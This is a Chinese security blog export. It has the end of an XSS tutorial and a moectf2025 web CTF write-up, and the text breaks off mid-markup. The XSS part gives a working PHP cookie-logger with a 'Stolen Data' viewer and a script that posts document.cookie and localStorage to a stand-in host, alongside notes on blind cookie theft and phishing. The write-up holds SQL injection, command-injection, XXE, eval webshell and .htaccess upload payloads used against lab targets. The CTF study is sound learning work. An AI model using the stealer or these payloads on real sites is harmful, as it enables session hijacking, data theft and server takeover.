plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 配置密码保护</span><br><span class="line">$password = &#x27;yourpassword123&#x27;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;view&#x27;]) &amp;&amp; $_GET[&#x27;view&#x27;] === $password) &#123;</span><br><span class="line">    // 显示收集的数据</span><br><span class="line">    header(&#x27;Content-Type: text/html&#x27;);</span><br><span class="line">    echo &#x27;&lt;h1&gt;Stolen Data&lt;/h1&gt;&lt;pre&gt;&#x27;;</span><br><span class="line">    echo file_get_contents(&#x27;stolen_data.log&#x27;);</span><br><span class="line">    echo &#x27;&lt;/pre&gt;&#x27;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 记录数据</span><br><span class="line">$data = [</span><br><span class="line">    &#x27;time&#x27; =&gt; date(&#x27;Y-m-d H:i:s&#x27;),</span><br><span class="line">    &#x27;ip&#x27; =&gt; $_SERVER[&#x27;REMOTE_ADDR&#x27;],</span><br><span class="line">    &#x27;cookie&#x27; =&gt; $_COOKIE,</span><br><span class="line">    &#x27;get&#x27; =&gt; $_GET,</span><br><span class="line">    &#x27;post&#x27; =&gt; $_POST,</span><br><span class="line">    &#x27;headers&#x27; =&gt; getallheaders()</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">file_put_contents(&#x27;data.txt&#x27;, json_encode($data).&quot;\n&quot;, FILE_APPEND);</span><br><span class="line"></span><br><span class="line">// 返回无害响应</span><br><span class="line">header(&#x27;Content-Type: image/gif&#x27;);</span><br><span class="line">echo base64_decode(&#x27;R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">fetch(&#x27;https://your-site.com/steal.php&#x27;, &#123;</span><br><span class="line">    method: &#x27;POST&#x27;,</span><br><span class="line">    headers: &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;,</span><br><span class="line">    body: JSON.stringify(&#123;</span><br><span class="line">        cookie: document.cookie,</span><br><span class="line">        url: location.href,</span><br><span class="line">        userAgent: navigator.userAgent,</span><br><span class="line">        localStorage: JSON.stringify(localStorage)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;).catch(e =&gt; console.error(e));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="安全防御"><a href="#安全防御" class="headerlink" title="安全防御"></a>安全防御</h1><p>【遇到安全防御，就跑路吧，本来利用的点就少，绕过也很鸡肋，可能ctf当中会出现关于考点绕过手段，需要使用的时候查相应cve或者文章就好了】</p><h2 id="csp"><a href="#csp" class="headerlink" title="csp"></a>csp</h2><p><a href="https://zhida.zhihu.com/search?content_id=254140465&content_type=Article&match_order=1&q=Content+Security+Policy&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjExMjg4MDgsInEiOiJDb250ZW50IFNlY3VyaXR5IFBvbGljeSIsInpoaWRhX3NvdXJjZSI6ImVudGl0eSIsImNvbnRlbnRfaWQiOjI1NDE0MDQ2NSwiY29udGVudF90eXBlIjoiQXJ0aWNsZSIsIm1hdGNoX29yZGVyIjoxLCJ6ZF90b2tlbiI6bnVsbH0.fjiJOVS7QHKYD8ZuPn9LZzbgPjj6EmqperajT0eWUZg&zhida_source=entity">Content Security Policy</a>（CSP）是一种浏览器安全机制，用于防止各种类型的<a href="https://zhida.zhihu.com/search?content_id=254140465&content_type=Article&match_order=1&q=%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjExMjg4MDgsInEiOiLot6jnq5nohJrmnKzmlLvlh7siLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoyNTQxNDA0NjUsImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.Dt3u0GHZEZ5dcLGm83Eg6EEwiwKqKAjs2UuR2M7cYb0&zhida_source=entity">跨站脚本攻击</a>（XSS）和<a href="https://zhida.zhihu.com/search?content_id=254140465&content_type=Article&match_order=1&q=%E6%95%B0%E6%8D%AE%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjExMjg4MDgsInEiOiLmlbDmja7ms6jlhaXmlLvlh7siLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoyNTQxNDA0NjUsImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.ldB8RMO-1-GDB2ZNl5nNdIIHN7NKoI0Ks91Ygu7xr6g&zhida_source=entity">数据注入攻击</a>。通过定义一组规则，CSP 允许网站管理员指定哪些资源可以被加载和执行，进而限制外部恶意脚本的执行，确保网站的安全性。CSP 为网站提供了一层额外的保护，可以有效地阻止恶意代码注入，提升网站的抗攻击能力。本文将详细讲解什么是 CSP，如何使用 CSP 配置 Web 应用程序的安全策略。</p><h2 id="httponly"><a href="#httponly" class="headerlink" title="httponly"></a>httponly</h2><p>如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击，窃取cookie内容，这样就增加了cookie的安全性，即便是这样，也不要将重要信息存入cookie。XSS全称Cross SiteScript，跨站脚本攻击，是Web程序中常见的漏洞，XSS属于被动式且用于客户端的攻击方式，所以容易被忽略其危害性。其原理是攻击者向有XSS漏洞的网站中输入(传入)恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。</p><p>绕过【实则不太管用】：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cve-2012</span><br><span class="line"></span><br><span class="line">phpinfo</span><br><span class="line"></span><br><span class="line">flash，java的api获取</span><br></pre></td></tr></table></figure><h2 id="xssfifter"><a href="#xssfifter" class="headerlink" title="xssfifter"></a>xssfifter</h2><p>就是前面的各种正则的限制手段，依旧标签过滤</p><h1 id="xss-stricke"><a href="#xss-stricke" class="headerlink" title="xss-stricke"></a>xss-stricke</h1><p>XSStrike是一款检测Cross Site Scripting的高级检测工具。它集成了payload生成器、爬虫和模糊引擎功能。XSStrike不是像其他工具那样注入有效负载并检查其工作，而是通过多个解析器分析响应，然后通过与模糊引擎集成的上下文分析来保证有效负载。除此之外，XSStrike还具有爬行，模糊测试，参数发现，WAF检测功能。它还会扫描DOM XSS漏洞。</p><p><a href="https://github.com/s0md3v/XSStrike">s0md3v&#x2F;XSStrike: Most advanced XSS scanner.</a></p><p>就像sql注入中的sqlmap</p><h1 id="攻防利用"><a href="#攻防利用" class="headerlink" title="攻防利用"></a>攻防利用</h1><p>关于xss的攻防利用，多用于组合拳的使用以及攻防时候，src利用的点少，能弹窗验证有漏洞点就好了，差异还是挺大的，但是问题不大，还是比较好食用</p><h2 id="cookie盗取"><a href="#cookie盗取" class="headerlink" title="cookie盗取"></a>cookie盗取</h2><p>就是盲打，把有数据交互的地方都插上payload，等想应登陆态的用户查看或者点击，以达到获得cookie会话</p><h2 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h2><p>弹窗跳转网页，或者提醒下载更新，已达到具体想要上线或者敏感信息获取的效果</p><h2 id="联合代码审计rce"><a href="#联合代码审计rce" class="headerlink" title="联合代码审计rce"></a>联合代码审计rce</h2><p>这是小迪安全2024xss部分的一个小皮面板案例，具体的cms偏代码审计的联动外部请求进行rce，需要特定情况下的xss条件才能产生</p>]]></content>
      
      
      <categories>
          
          <category> 一个男人一句话改变我的一生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个男人一句话改变我的一生之moectf2025</title>
      <link href="/posts/63963.html"/>
      <url>/posts/63963.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当初川师范大学cssec信安组的CoHyu大师傅的一句moectf是梦开启的地方以及Sonder大师傅的moectf的题质量都很高，可以加油学学.</span><br><span class="line">于是就打了moectf2025，但时间线太长了就打了一周，现在完赛了</span><br><span class="line">于是打算复现一手web以及pwn部分，pwn部分就放到《每天都要pwn一点》系列了</span><br></pre></td></tr></table></figure><h1 id="moectf2025"><a href="#moectf2025" class="headerlink" title="moectf2025"></a>moectf2025</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.xidian.edu.cn/training/22</span><br></pre></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="0-Web入门指北"><a href="#0-Web入门指北" class="headerlink" title="0 Web入门指北"></a><strong>0 Web入门指北</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">你知道什么是控制台吗？快去了解一下吧！</span><br><span class="line"></span><br><span class="line">((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[]).......</span><br></pre></td></tr></table></figure><h4 id="考点：jsfuck编码。"><a href="#考点：jsfuck编码。" class="headerlink" title="考点：jsfuck编码。"></a>考点：jsfuck编码。</h4><p>可以控制台解也可以解码工具解</p><p><img src="/../images/image-20251013223042633-1760512687698-47.png" alt="image-20251013223042633"></p><h3 id="01-第一章-神秘的手镯"><a href="#01-第一章-神秘的手镯" class="headerlink" title="01 第一章 神秘的手镯"></a><strong>01 第一章 神秘的手镯</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省流：这个手镯需要输入咒语才能启封？</span><br></pre></td></tr></table></figure><h4 id="预期解1考点-f12查看源码"><a href="#预期解1考点-f12查看源码" class="headerlink" title="预期解1考点:f12查看源码"></a>预期解1考点:f12查看源码</h4><p><img src="/../images/image-20251013223357956-1760512687698-46.png" alt="image-20251013223357956"></p><h4 id="预期解2考点-修改html"><a href="#预期解2考点-修改html" class="headerlink" title="预期解2考点:修改html"></a>预期解2考点:修改html</h4><p><img src="/../images/image-20251013223817177-1760512687698-45.png" alt="image-20251013223817177"></p><p><img src="/../images/image-20251013223832803-1760512687698-44.png" alt="image-20251013223832803"></p><h3 id="01-第一章-神秘的手镯-revenge"><a href="#01-第一章-神秘的手镯-revenge" class="headerlink" title="01 第一章 神秘的手镯_revenge"></a><strong>01 第一章 神秘的手镯_revenge</strong></h3><h4 id="考点：爆破"><a href="#考点：爆破" class="headerlink" title="考点：爆破"></a>考点：爆破</h4><p>根据hint访问&#x2F;wanyanzhou.txt.bak</p><p><img src="/../images/image-20251015110629525-1760512687698-51.png" alt="image-20251015110629525"></p><p>要重复放500次的密码官wp说禁止了python等传输，要用bp等爆破500次就能拿到flag</p><h3 id="02-第二章-初识金曦玄轨"><a href="#02-第二章-初识金曦玄轨" class="headerlink" title="02 第二章 初识金曦玄轨"></a><strong>02 第二章 初识金曦玄轨</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省流：你知道什么是http请求包吗？抓一个看看吧！</span><br></pre></td></tr></table></figure><p>f12查看模糊的字符串，前往&#x2F;golden_trail</p><p><img src="/../images/image-20251013224031764-1760512687698-48.png" alt="image-20251013224031764"></p><h4 id="考点：抓包"><a href="#考点：抓包" class="headerlink" title="考点：抓包"></a>考点：抓包</h4><p><img src="/../images/image-20251013224913661-1760512687698-49.png" alt="image-20251013224913661"></p><h3 id="03-第三章-问剑石！篡天改命！"><a href="#03-第三章-问剑石！篡天改命！" class="headerlink" title="03 第三章 问剑石！篡天改命！"></a><strong>03 第三章 问剑石！篡天改命！</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省流：仙门试炼台中央矗立着玄天剑宗至宝&quot;问剑石&quot;，石身流转着七彩霞光。你作为新晋弟子需测试天赋，但暗中知晓问剑石运作的玄机——其天赋判定实则通过金曦玄轨传递信息。初始测试将显示天赋：B，光芒：无，你需要施展&quot;篡天改命&quot;之术，修改玄轨中的关键参数，使问剑石显现天赋：S，光芒：流云状青芒(flowing_azure_clouds)的异象，从而获得宗门重视！</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251013230410807-1760512687699-58.png" alt="image-20251013230410807"></p><h4 id="考点：get-post请求"><a href="#考点：get-post请求" class="headerlink" title="考点：get&#x2F;post请求"></a>考点：get&#x2F;post请求</h4><p>注意post是json格式就好了</p><p><img src="/../images/image-20251013230448086-1760512687698-53.png" alt="image-20251013230448086"></p><h3 id="04-第四章-金曦破禁与七绝傀儡阵"><a href="#04-第四章-金曦破禁与七绝傀儡阵" class="headerlink" title="04 第四章 金曦破禁与七绝傀儡阵"></a><strong>04 第四章 金曦破禁与七绝傀儡阵</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省流：http请求有很多讲究！试试吧！</span><br></pre></td></tr></table></figure><h4 id="考点：http协议"><a href="#考点：http协议" class="headerlink" title="考点：http协议"></a>考点：http协议</h4><p>第一关</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:11060/stone_golem?key=xdsec</span><br></pre></td></tr></table></figure><p>第二关<img src="/../images/image-20251013231927750-1760512687698-50.png" alt="image-20251013231927750"></p><p>第三关</p><p><img src="/../images/image-20251013232131503-1760512687698-52.png" alt="image-20251013232131503"></p><p>第四关</p><p><img src="/../images/image-20251013232220770-1760512687699-54.png" alt="image-20251013232220770"></p><p>第五关</p><p><img src="/../images/image-20251013232344908-1760512687699-56.png" alt="image-20251013232344908"></p><p>第六关</p><p><img src="/../images/image-20251013232428421-1760512687699-55.png" alt="image-20251013232428421"></p><p>第七关</p><p><img src="/../images/image-20251013232541334-1760512687699-57.png" alt="image-20251013232541334"></p><p>全部密钥合起来base64解密即可</p><h3 id="05-第五章-打上门来！"><a href="#05-第五章-打上门来！" class="headerlink" title="05 第五章 打上门来！"></a><strong>05 第五章 打上门来！</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省流：CTF中有一招在文件目录中穿梭的技法，是什么呢？</span><br></pre></td></tr></table></figure><h4 id="考点：目录穿越"><a href="#考点：目录穿越" class="headerlink" title="考点：目录穿越"></a>考点：目录穿越</h4><p><img src="/../images/image-20251013233525724-1760512687699-61.png" alt="image-20251013233525724"></p><h3 id="06-第六章-藏经禁制？玄机初探！"><a href="#06-第六章-藏经禁制？玄机初探！" class="headerlink" title="06 第六章 藏经禁制？玄机初探！"></a><strong>06 第六章 藏经禁制？玄机初探！</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省流：一个登录页面。（不告诉我账号密码就让我登录，难道我是神仙吗哈哈？）</span><br></pre></td></tr></table></figure><h4 id="考点：sql的万能密码登陆"><a href="#考点：sql的万能密码登陆" class="headerlink" title="考点：sql的万能密码登陆"></a>考点：sql的万能密码登陆</h4><p><img src="/../images/image-20251013233713280-1760512687699-60.png" alt="image-20251013233713280"></p><h3 id="07-第七章-灵蛛探穴与阴阳双生符"><a href="#07-第七章-灵蛛探穴与阴阳双生符" class="headerlink" title="07 第七章 灵蛛探穴与阴阳双生符"></a><strong>07 第七章 灵蛛探穴与阴阳双生符</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省流：有这样一个文件，它是一个存放在网站根目录下的纯文本文件，用于告知搜索引擎爬虫哪些页面可以抓取，哪些页面不应被抓取。它是网站与搜索引擎之间的 “协议”，帮助网站管理爬虫的访问行为，保护隐私内容、节省服务器资源或引导爬虫优先抓取重要页面。</span><br></pre></td></tr></table></figure><h4 id="考点：robots-txt，md5弱比较"><a href="#考点：robots-txt，md5弱比较" class="headerlink" title="考点：robots.txt，md5弱比较"></a>考点：robots.txt，md5弱比较</h4><p>访问&#x2F;robots.txt 进入flag.php</p><p><img src="/../images/image-20251013234409035-1760512687699-59.png" alt="image-20251013234409035"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?a[]=1&amp;b[]=2出现报错，看官wp是在php8版本下被禁用了</span><br><span class="line"># 强相等</span><br><span class="line">/?a=TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak&amp;b=TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak</span><br><span class="line"># 弱相等</span><br><span class="line">/?a=QNKCDZO&amp;b=240610708</span><br></pre></td></tr></table></figure><h3 id="08-第八章-天衍真言，星图显圣"><a href="#08-第八章-天衍真言，星图显圣" class="headerlink" title="08 第八章 天衍真言，星图显圣"></a><strong>08 第八章 天衍真言，星图显圣</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省流：和上次一样的界面，那我再登录一次就行了……吗？</span><br></pre></td></tr></table></figure><h4 id="考点：简单的sql注入"><a href="#考点：简单的sql注入" class="headerlink" title="考点：简单的sql注入"></a>考点：简单的sql注入</h4><p>sqlmap的使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:4858/?username=守陵人&amp;password=周天星诀&quot; --batch --dbs</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:4858/?username=守陵人&amp;password=周天星诀&quot; --batch -D user --tables</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:4858/?username=守陵人&amp;password=周天星诀&quot; --batch -D user -T flag --columns</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:4858/?username=守陵人&amp;password=周天星诀&quot; --batch -D user -T flag --dump</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251013235658528-1760512687700-65.png" alt="image-20251013235658528"></p><p>手测【官wp】：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; UNION SELECT 1,2 #</span><br><span class="line"># 回显 Welcome 1</span><br><span class="line"></span><br><span class="line">1&#x27; union select table_name,2 from information_schema.tables where table_schema=database() #</span><br><span class="line"># 回显 Welcome flag</span><br><span class="line"></span><br><span class="line">1&#x27; union select column_name,2 from information_schema.columns where table_name=&#x27;flag&#x27; #</span><br><span class="line"># 回显 Welcome value</span><br><span class="line"></span><br><span class="line">1&#x27; union select value,2 from flag #</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251013235903297-1760512687700-64.png" alt="image-20251013235903297"></p><h3 id="09-第九章-星墟禁制·天机问路"><a href="#09-第九章-星墟禁制·天机问路" class="headerlink" title="09 第九章 星墟禁制·天机问路"></a><strong>09 第九章 星墟禁制·天机问路</strong></h3><h4 id="考点：-URL-参数直接向服务器系统发送命令"><a href="#考点：-URL-参数直接向服务器系统发送命令" class="headerlink" title="考点： URL 参数直接向服务器系统发送命令"></a>考点： URL 参数直接向服务器系统发送命令</h4><p>官wp给出的php核心源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd = $_GET[&#x27;url&#x27;];</span><br><span class="line">system(&quot;nslookup &quot; . $cmd);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=baidu.com;env</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251014125213965-1760512687699-62.png" alt="image-20251014125213965"></p><h3 id="10-第十章-天机符阵"><a href="#10-第十章-天机符阵" class="headerlink" title="10 第十章 天机符阵"></a><strong>10 第十章 天机符阵</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省流：flag在flag.txt里</span><br></pre></td></tr></table></figure><h4 id="考点：xxe注入"><a href="#考点：xxe注入" class="headerlink" title="考点：xxe注入"></a>考点：xxe注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">  &lt;!ENTITY abc SYSTEM &quot;file:///var/www/html/flag.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;解析&gt;&amp;abc;&lt;/解析&gt;</span><br></pre></td></tr></table></figure><h3 id="10-第十章-天机符阵-revenge"><a href="#10-第十章-天机符阵-revenge" class="headerlink" title="10 第十章 天机符阵_revenge"></a><strong>10 第十章 天机符阵_revenge</strong></h3><h4 id="考点：XXE注入"><a href="#考点：XXE注入" class="headerlink" title="考点：XXE注入"></a>考点：<code>XXE</code>注入</h4><p>flag的位置不同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">  &lt;!ENTITY abc SYSTEM &quot;file:///flag.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;解析&gt;&amp;abc;&lt;/解析&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251015111745490-1760512687699-63.png" alt="image-20251015111745490"></p><h3 id="11-第十一章-千机变·破妄之眼"><a href="#11-第十一章-千机变·破妄之眼" class="headerlink" title="11 第十一章 千机变·破妄之眼"></a><strong>11 第十一章 千机变·破妄之眼</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省流：HDdss看到了 GET 参数名由m,n,o,p,q这五个字母组成（每个字母出现且仅出现一次），长度正好为 5，虽然不清楚字母的具体顺序，但是他知道参数名等于参数值才能进入。</span><br></pre></td></tr></table></figure><h4 id="考点：爆破参数名，php伪协议读取文件"><a href="#考点：爆破参数名，php伪协议读取文件" class="headerlink" title="考点：爆破参数名，php伪协议读取文件"></a>考点：爆破参数名，php伪协议读取文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="12-第十二章-玉魄玄关·破妄"><a href="#12-第十二章-玉魄玄关·破妄" class="headerlink" title="12 第十二章 玉魄玄关·破妄"></a><strong>12 第十二章 玉魄玄关·破妄</strong></h3><h4 id="考点：连接一句话木马"><a href="#考点：连接一句话木马" class="headerlink" title="考点：连接一句话木马"></a>考点：连接一句话木马</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省流：这道题用于学习 蚁剑 的使用，请使用 蚁剑 完成本题</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251014130414238-1760512687700-66.png" alt="image-20251014130414238"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=system(&quot;env&quot;);</span><br></pre></td></tr></table></figure><h3 id="13-第十三章-通幽关·灵纹诡影"><a href="#13-第十三章-通幽关·灵纹诡影" class="headerlink" title="13 第十三章 通幽关·灵纹诡影"></a>13 第十三章 通幽关·灵纹诡影</h3><h4 id="考点：图片马文件上传"><a href="#考点：图片马文件上传" class="headerlink" title="考点：图片马文件上传"></a>考点：图片马文件上传</h4><p>只过滤了jpg的文件头，做一个图片马即可，后缀都不用改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg/b + 2.php/a 3.php</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251014132349848-1760512687700-67.png" alt="image-20251014132349848"></p><h3 id="14-第十四章-御神关·补天玉碑"><a href="#14-第十四章-御神关·补天玉碑" class="headerlink" title="14 第十四章 御神关·补天玉碑"></a><strong>14 第十四章 御神关·补天玉碑</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省流：Apache有一个特殊文件，是什么呢？</span><br></pre></td></tr></table></figure><h4 id="考点：-htaccess文件上传"><a href="#考点：-htaccess文件上传" class="headerlink" title="考点：.htaccess文件上传"></a>考点：.htaccess文件上传</h4><p>先上传一个<code>.htaccess</code>文件,重写解析规则，当PHP文件执行就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.jpg&quot;&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>然后依旧把图片马放上去就好了</p><p><img src="/../images/image-20251014161940352-1760512687700-70.png" alt="image-20251014161940352"></p><h3 id="15-第十五章-归真关·竞时净魔"><a href="#15-第十五章-归真关·竞时净魔" class="headerlink" title="15 第十五章 归真关·竞时净魔"></a><strong>15 第十五章 归真关·竞时净魔</strong></h3><h4 id="考点：条件竞争文件上传"><a href="#考点：条件竞争文件上传" class="headerlink" title="考点：条件竞争文件上传"></a>考点：条件竞争文件上传</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省流：图片上传至/uploads</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/weixin_45588247/article/details/118796606">【文件上传绕过】——条件竞争漏洞_条件竞争上传漏洞-CSDN博客</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">条件竞争，一边使用爆破一直高速上传一个普通木马文件，一边使用爆破访问这个木马文件。</span><br></pre></td></tr></table></figure><h3 id="16-第十六章-昆仑星途"><a href="#16-第十六章-昆仑星途" class="headerlink" title="16 第十六章 昆仑星途"></a><strong>16 第十六章 昆仑星途</strong></h3><h4 id="考点：文件包含漏洞"><a href="#考点：文件包含漏洞" class="headerlink" title="考点：文件包含漏洞"></a>考点：<strong>文件包含漏洞</strong></h4><p><img src="/../images/image-20251014162605420-1760512687700-71.png" alt="image-20251014162605420"></p><p>php伪协议的data</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 